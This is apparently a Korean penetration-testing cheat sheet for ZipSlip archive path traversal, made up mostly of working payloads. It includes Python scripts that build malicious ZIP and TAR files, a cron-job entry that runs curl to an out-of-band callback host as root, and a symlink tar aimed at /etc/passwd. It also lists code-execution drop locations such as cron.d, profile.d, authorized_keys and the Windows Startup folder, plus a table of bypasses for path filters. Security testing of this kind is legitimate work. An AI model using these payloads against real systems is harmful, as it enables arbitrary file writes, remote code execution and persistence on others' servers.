### 기본 페이로드

#### 테스트 ZIP 생성 (Python)
```python
import zipfile, io, time
u = int(time.time())
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # 웹루트 traversal (가장 확실한 검증)
    zf.writestr(f'../../public/zipslip-{u}.txt', 'ZIPSLIP_MARKER')
    # 절대 경로
    zf.writestr(f'/tmp/zipslip-abs-{u}.txt', 'ABS_MARKER')
    # 정상 entry (비교용)
    zf.writestr('normal.txt', 'normal')
open('zipslip-test.zip', 'wb').write(buf.getvalue())
```

#### Entry name 변형 (path 변형)
- `../../public/<unique>.txt` (Linux 웹루트)
- `..\..\public\<unique>.txt` (Windows backslash)
- `/etc/cron.d/<unique>` (Linux 절대경로)
- `C:\Windows\Temp\<unique>.txt` (Windows 절대)
- `....//....//etc/passwd` (이중 dot)
- `..%2f..%2fetc%2fpasswd` (URL encoded — 일부 라이브러리 디코드)
- `/var/www/html/<unique>.php` (PHP 실행 경로)

#### RCE 게이트 entry (실행 트리거 위치)
- `/etc/cron.d/<unique>` — Linux cron (분당 실행)
- `/etc/profile.d/<unique>.sh` — 셸 로그인 시
- `~/.ssh/authorized_keys` — SSH 키 추가
- `/var/spool/cron/root` — root crontab
- `C:\Users\Public\Start Menu\Programs\Startup\<x>.bat` — Windows 시작
- `/var/www/html/<unique>.php` — 웹 실행
- `/usr/local/bin/<unique>` (PATH 첫번째 디렉토리)

#### OAST 콜백 ZIP (Blind 검증)
```python
import zipfile, io, time
oast = "https://CALLBACK.oast.fun"
u = int(time.time())
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    # cron.d (분당 실행 → 콜백)
    zf.writestr(f'../../etc/cron.d/zipslip-{u}',
        f'* * * * * root curl -s "{oast}/cron-{u}"\n')
    # 마커 파일 (직접 검증)
    zf.writestr(f'../../public/zipslip-{u}.txt', 'MARKER')
open('zipslip-oast.zip', 'wb').write(buf.getvalue())
```

#### Symlink ZIP (zipslip 대체)
```python
import tarfile, io, time
u = int(time.time())
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w') as tf:
    info = tarfile.TarInfo(f'symlink-{u}')
    info.type = tarfile.SYMTYPE
    info.linkname = '/etc/passwd'
    tf.addfile(info)
open('symlink-test.tar', 'wb').write(buf.getvalue())
```

#### 검증 흐름
```bash
# 1. 업로드
curl -X POST "https://target/api/upload" -H "Cookie: session=..." \
  -F "file=@zipslip-test.zip" -v

# 2. 웹 접근 검증 (가장 확실)
curl "https://target/zipslip-<TIMESTAMP>.txt"
# 응답이 "ZIPSLIP_MARKER"이면 확인됨

# 3. OAST 콜백 모니터링
# (cron이 실행되면 1분 내 callback 수신)
```

---

### 우회 페이로드

| 방어 | 페이로드 (entry name) |
|---|---|
| `startsWith(base)` (separator 누락) | `/safe-evil/x` (prefix 통과) |
| `..` 단일 차단 (`replace("..", "")`) | `....//`, `....\\\\`, `..%2f`, `..%5c`, `..\\..\\`, `....//....` |
| URL 디코딩 후 `..` 검증 | Double encoding `%252e%252e%252f`, UTF-8 over-long `..%c0%af` |
| 절대경로 차단 (`startsWith('/')`) | Windows `\path`, UNC `\\\\server\\share`, drive letter `C:\\path`, `\\?\C:\path` |
| canonical path 검증 후 해제 | TOCTOU race — 검증 시점과 쓰기 시점 사이 symlink 생성 |
| symlink entry skip | hard link (HRDLNK type), tar PAX header, GNU long name (`L`/`K` type) |
| 압축 해제 전 검증 루프 | 검증 후 별도 라이브러리로 해제 — 두 구현 차이 |
| Unicode 정규화 누락 | `．．／` (fullwidth period+slash), `..%c0%af` (overlong UTF-8) |
| 확장자 검증 | `evil.jpg.sh` (이중 확장자), `evil.jpg/../../etc/x` |
| ZIP entry name 길이 제한 | 짧은 traversal `../x`, 단일 `../` 반복 |

#### TOCTOU race
```python
# 1. 정상 entry로 검증 통과
# 2. 동시에 다른 프로세스가 ZIP 파일 자체 교체 (race)
# 일반적으로 추가 인프라 필요 — 응답 시간으로 추정
```

---

### 참고사항

- 압축 해제 시점에 외부 검증이 어려움 — OAST + 웹루트 접근 병행 필수
- 웹루트 (`public/`, `static/`, `uploads/`) 상대 경로를 소스에서 사전 파악
- 실행 트리거 (cron, profile, .ssh/authorized_keys, /tmp/.so) 같은 위치는 즉시 RCE 게이트
- OOXML/JAR/APK 파일도 내부 ZIP — 같은 검증 필요
- adm-zip 0.5.10 미만, rubyzip 1.3.0 미만, Python 3.12 미만 (filter 미적용) 환경 별도 점검
- `path.join`/`Path.combine`은 절대 경로 entry 받으면 base 무시 (Java `new File(base, entry)` 동일)
- Windows + Linux 혼용 환경에서 `\\` 정규화 차이로 우회 가능
- 압축 폭탄 (zip bomb)은 ZipSlip은 아니지만 같은 sink에서 DoS
- HTTP 업로드 외 메일 첨부, S3 import, CI artifact 같은 경로도 동일 위험
- Symlink entry는 tar 형식 — ZIP은 symlink 미지원 (단 일부 라이브러리는 임의 entry 허용)
- 실제 RCE 게이트 (cron.d/profile.d) 사용 시 실제 코드 실행 → sandbox 한정
- 마커 파일 (`ZIPSLIP_MARKER`)은 unique timestamp 사용해 collision/false positive 회피
- canonical path 검증 후 해제도 TOCTOU race로 우회 가능 (드물지만 존재)
- 일부 라이브러리는 ZIP central directory와 local header가 다른 path 가질 때 처리 차이 — 추가 검증면
